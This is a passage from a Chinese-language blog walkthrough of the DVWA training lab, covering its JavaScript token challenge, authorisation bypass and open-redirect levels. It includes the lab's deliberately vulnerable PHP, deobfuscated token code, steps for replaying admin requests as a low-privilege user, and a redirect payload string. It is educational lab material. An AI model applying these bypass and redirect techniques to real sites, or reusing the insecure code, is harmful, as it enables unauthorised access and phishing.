<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;&lt;script src=&quot;&#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;vulnerabilities/javascript/source/high.js&quot;&gt;&lt;/script&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span>=<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;fromCharCode&#x27;</span>,<span class="hljs-string">&#x27;toString&#x27;</span>,<span class="hljs-string">&#x27;replace&#x27;</span>,<span class="hljs-string">&#x27;BeJ&#x27;</span>,<span class="hljs-string">&#x27;\x5cw+&#x27;</span>,<span class="hljs-string">&#x27;Lyg&#x27;</span>,<span class="hljs-string">&#x27;SuR&#x27;</span>,<span class="hljs-string">&#x27;(w()&#123;\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:&#123;&#125;;p(Y.3N).........!&#x27;</span><span class="hljs-string">&#x27;[b(&#x27;</span>0x2<span class="hljs-string">&#x27;)](/^/,String))&#123;while(f--)&#123;i[h(f)]=g[f]||h(f);&#125;g=[function(k)&#123;if(&#x27;</span>wpA<span class="hljs-string">&#x27;!==b(&#x27;</span>0x3<span class="hljs-string">&#x27;))&#123;return i[k];&#125;else&#123;while(f--)&#123;i[k(f)]=g[f]||k(f);&#125;g=[function(l)&#123;return i[l];&#125;];k=function()&#123;return b(&#x27;</span>0x4<span class="hljs-string">&#x27;);&#125;;f=0x1;&#125;&#125;];h=function()&#123;return b(&#x27;</span>0x4<span class="hljs-string">&#x27;);&#125;;f=0x1;&#125;;while(f--)&#123;if(g[f])&#123;if(b(&#x27;</span>0x5<span class="hljs-string">&#x27;)===b(&#x27;</span>0x6<span class="hljs-string">&#x27;))&#123;return i[h];&#125;else&#123;d=d[b(&#x27;</span>0x2<span class="hljs-string">&#x27;)](new RegExp(&#x27;</span>\x5cb<span class="hljs-string">&#x27;+h(f)+&#x27;</span>\x5cb<span class="hljs-string">&#x27;,&#x27;</span>g<span class="hljs-string">&#x27;),g[f]);&#125;&#125;&#125;return d;&#125;(b(&#x27;</span>0x7<span class="hljs-string">&#x27;),0x3e,0x137,b(&#x27;</span>0x8<span class="hljs-string">&#x27;)[b(&#x27;</span>0x9<span class="hljs-string">&#x27;)](&#x27;</span>|<span class="hljs-string">&#x27;),0x0,&#123;&#125;));</span></span><br></code></pre></td></tr></table></figure>
<p>这里的代码是被混淆了，我们用在线网站解密一下：<a target="_blank" rel="noopener" href="http://deobfuscatejavascript.com/#">http://deobfuscatejavascript.com/#</a></p>
<p>重点代码在后面：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">do_something</span>(<span class="hljs-params">e</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> t = <span class="hljs-string">&quot;&quot;</span>, n = e.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; n &gt;= <span class="hljs-number">0</span>; n--) t += e[n];<br>    <span class="hljs-keyword">return</span> t<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_3</span>(<span class="hljs-params">t, y = <span class="hljs-string">&quot;ZZ&quot;</span></span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> + y)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_2</span>(<span class="hljs-params">e = <span class="hljs-string">&quot;YY&quot;</span></span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(e + <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span>)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_1</span>(<span class="hljs-params">a, b</span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">do_something</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span>)<br>&#125;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">token_part_2</span>(<span class="hljs-string">&quot;XX&quot;</span>)<br>&#125;, <span class="hljs-number">300</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;send&quot;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, token_part_3);<br><span class="hljs-title function_">token_part_1</span>(<span class="hljs-string">&quot;ABCD&quot;</span>, <span class="hljs-number">44</span>);<br></code></pre></td></tr></table></figure>
<p>这里首先将phrase的value赋值为空，接着调用<code>token_part_1</code>函数，将phrase的值倒序输出，随后延迟300s调用token_part_2函数，YY经过sha加密，赋值给token的value，然后当我们点击submit按钮时，调用token_part_3函数将token值拼接ZZ接着经过sha加密，赋值给token的value</p>
<p>这里可以看到我们输入的success，与这些代码根本无关，因为其phrase的值始终被设置为0，我们进F12调试看看</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113165956794.png" alt="image-20240113165956794"></p>
<p>我们在右侧下个对于鼠标click的断点，接着我们点击上面的文本框，会发现我们成功进入断点调试，接着一直按运行键，会发现左侧出现了我们之前解混淆的js代码，接着我们对part1函数下断点，同时取消对click的断点</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113170103903.png" alt="image-20240113170103903"></p>
<p>然后去控制台设置phrase的值为success，按下图所示。接着回车一下，随后放行，会发现在输入框中出现succes，接着我们点击submit按钮发送即可发现成功修改</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113170302051.png" alt="image-20240113170302051"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113170500908.png" alt="image-20240113170500908"></p>
<h2 id="Impossible-14">Impossible</h2>
<p>You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.</p>
<p>直接把用户输入的地方关了，这无从下手了。。。。。</p>
<h1>0x15 Authorisation Bypass</h1>
<p>This page should only be accessible by the admin user. Your challenge is to gain access to the features using one of the other users, for example <em>gordonb</em> / <em>abc123</em>.</p>
<p>这意味着这是一个未授权访问的漏洞，我们的目标是以gordonb这一低级别用户访问管理员才可以访问的页面</p>
<h2 id="Low-15">Low</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Nothing to see here for this vulnerability, have a look</span><br><span class="hljs-comment">instead at the dvwaHtmlEcho function in:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">* dvwa/includes/dvwaPage.inc.php</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>可见这里没有任何限制，是存在未授权访问的，让我们先以低级别用户登录看看</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113180442459.png" alt="image-20240113180442459"></p>
<p>如上图，可以看到我们当前用户是没有权限访问到刚才的页面的，接下来我们尝试抓包，看一下刚刚管理员页面的url地址</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113180617876.png" alt="image-20240113180617876"></p>
<p>如上图，接下来让我们尝试直接访问该url地址</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113181023564.png" alt="image-20240113181023564"></p>
<p>可以看到成功未授权</p>
<h2 id="Medium-15">Medium</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Only the admin user is allowed to access this page.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Have a look at these two files for possible vulnerabilities: </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">* vulnerabilities/authbypass/get_user_data.php</span><br><span class="hljs-comment">* vulnerabilities/authbypass/change_user_details.php</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() != <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Unauthorised&quot;</span>;<br>    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">403</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里他会判断该用户是否为admin，如果不是则返回403。</p>
<p>但值得注意的是，这段代码似乎只是检查medium.php页面。</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113190732432.png" alt="image-20240113190732432"></p>
<p>我们继续bp抓一下看看该页面的功能点，可以看到当我们点击update按钮的时候，我们实际上是被get_user_data.php页面进行处理，接下来我们可以猜测该页面没有做未授权处理，我们可以尝试直接访问该页面看看</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113190819631.png" alt="image-20240113190819631"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113190942972.png" alt="image-20240113190942972"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113190925561.png" alt="image-20240113190925561"></p>
<p>可以看到虽然其只对medium.php做了限制，当我们访问getuserdata的时候，仍然可以得到一些数据</p>
<h2 id="High-15">High</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Only the admin user is allowed to access this page.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Have a look at this file for possible vulnerabilities: </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">* vulnerabilities/authbypass/change_user_details.php</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() != <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Unauthorised&quot;</span>;<br>    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">403</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>依旧是相同的代码，我们接着上一个级别的思路访问一下</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113192045447.png" alt="image-20240113192045447"></p>
<p>发现行不通了，这个api接口也被禁用了，接下来我们在管理员界面的更新数据地方，进行bp抓包，如下图发现，这里的api接口改为了change功能，而我们可以注意到上一个级别是get功能，这不禁让我们猜测，该功能可能并没有做出有效的未授权访问限制</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113193309714.png" alt="image-20240113193309714"></p>
<p>跟踪相关代码也可以发现，这里只对impossible级别做出的严格限制</p>
<p>接下来我们用其他用户访问该api页面，同时bp抓包admin用户的change功能对应的数据包</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113193638811.png" alt="image-20240113193638811"></p>
<p>接下来尝试将上面的json数据赋值到下面的普通用户数据包中，点击发送可以看到右侧回显访问成功的标志</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113193607250.png" alt="image-20240113193607250"></p>
<h2 id="Impossible-15">Impossible</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Only the admin user is allowed to access this page</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() != <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Unauthorised&quot;</span>;<br>    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">403</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里的代码依旧没有什么变化，但我们跟踪相关文件可以发现：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113192943263.png" alt="image-20240113192943263"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113192956066.png" alt="image-20240113192956066"></p>
<p>这两个api功能文件在对impossible级别上都做出了严格的限制，只要当前用户不是admin，则无权访问，这是无法绕过的</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113193922658.png" alt="image-20240113193922658"></p>
<p>这里经过测试发现，直接显示无权访问</p>
<h1>0x16 HTTP 重定向</h1>
<h2 id="Low-16">Low</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>] != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>]);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">http_response_code</span> (<span class="hljs-number">500</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;p&gt;Missing redirect target.&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">exit</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里判断redirect参数是否通过get传参，是否存在，如果存在，则直接重定向到url，随后结束脚本执行，否则页面返回500响应。</p>
<p>这里并没有任何过滤，我们可以重定向到任何页面</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113172651501.png" alt="image-20240113172651501"></p>
<h2 id="Medium-16">Medium</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>] != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span> (<span class="hljs-string">&quot;/http:\/\/|https:\/\//i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">http_response_code</span> (<span class="hljs-number">500</span>);<br>        <span class="hljs-meta">?&gt;</span><br>        &lt;p&gt;Absolute URLs not allowed.&lt;/p&gt;<br>        <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">http_response_code</span> (<span class="hljs-number">500</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;p&gt;Missing redirect target.&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">exit</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里限制了redirect参数以<a target="_blank" rel="noopener" href="http://xn--https-wm6jl44o">http://或者https</a>://开头，也就是不能以绝对的url开头，但是我们可以使用相对的url</p>
<p>这里借用阮一峰老师对相对url与绝对url的解释：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss">URL 分成两种：绝对 URL 和相对 URL。<br><br>    绝对 URL 指的是，只靠 URL 本身就能确定资源的位置。这意味着，URL 必须带有资源的完整信息，包含协议、主机、路径等部分。前面的例子都是绝对 URL。<br><br>    相对 URL 指的是，URL 不包含资源位置的全部信息，必须结合当前网页的位置，才能定位资源。比如，当前网页的 URL 是https://www.example.com/path/index.html，该网页上面有一个资源，URL 指向a.html，这个就是相对 URL。因为只知道a.html，并不能定位资源。浏览器假定，a.html与当前网址在同一个子目录下面，从而得到绝对 URL https://www.example.com/path/a.html。<br><br>相对 URL 如果以斜杠（/）开头，就表示网站的根目录。否则，必须以当前目录为起点，推算资源的位置。比如，相对 URL /foo/bar.html表示网站根目录的子目录foo，foo/bar.html表示在当前目录的foo子目录。<br><br>URL 还可以使用两个特殊简写，表示特定位置。<br><br>.：表示当前目录，比如./a.html（当前目录下的a.html文件）<br>..：表示上级目录，比如../a.html（上级目录下的a.html文件）<br>这两种简写可以多个连用，比如../../表示上两级目录。<br><br>绝对 URL 也可以使用这两个简写，比如www.example.com/./index.html等同于www.example.com/index.html，这时.相当于根目录的当前目录，即根目录本身。<br></code></pre></td></tr></table></figure>
<p>因此这一关我们可以这样构造</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113174804930.png" alt="image-20240113174804930"></p>
<h2 id="High-16">High</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>] != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>], <span class="hljs-string">&quot;info.php&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">http_response_code</span> (<span class="hljs-number">500</span>);<br>        <span class="hljs-meta">?&gt;</span><br>        &lt;p&gt;You can only redirect to the info page.&lt;/p&gt;<br>        <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">http_response_code</span> (<span class="hljs-number">500</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;p&gt;Missing redirect target.&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">exit</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里检查redirect中是否含有info.php字符串，如果含有才会正常的去请求重定向，否则返回500。</p>
<p>由代码审计得，在构造参数时是指包含字符串info.php即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Payload：?redirect=https//www.baidu.com/?已定义参数=info.php<br></code></pre></td></tr></table></figure>
<p>注意：需要参考网页支持的参数来传递info.php。例如 当该网页没有设定a参数的get传参时：</p>
<p><code>GET ?redirect=https//www.baidu.com/?a=info.php</code> 是无效的，因为字符串&quot;info.php&quot;并未传递给合法的参数</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113175207282.png" alt="image-20240113175207282"></p>
<h2 id="Impossible-16">Impossible</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">&quot;redirect&quot;</span>, <span class="hljs-variable">$_GET</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-title function_ invoke__">intval</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;info.php?id=1&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;info.php?id=2&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">99</span>:<br>            <span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;https://digi.ninja&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$target</span> != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: &quot;</span> . <span class="hljs-variable">$target</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-meta">?&gt;</span><br>        Unknown redirect target.<br>        <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>Missing redirect target.<br></code></pre></td></tr></table></figure>
<p>这里采用了表名单过滤，并且将redirect参数内容转换为了整数，这意味着redirect对我们来说已经不可控了</p>
<h1>0x18 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_77485708/article/details/131222466">[网络安全] DVWA之Open HTTP Redirect 攻击姿势及解题详析合集</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bookstack.cn/read/html-tutorial/spilt.4.docs-url.md">绝对 URL 和相对 URL</a></p>
<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/dvwa.html#%E9%83%A8%E7%BD%B2%E5%AE%89%E8%A3%85">DVWA 入门靶场学习记录</a></p>
</script></p>
                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://hybcx.xyz/2024/01/10/shen-ru-dvwa/">http://hybcx.xyz/2024/01/10/shen-ru-dvwa/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">hybcx</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
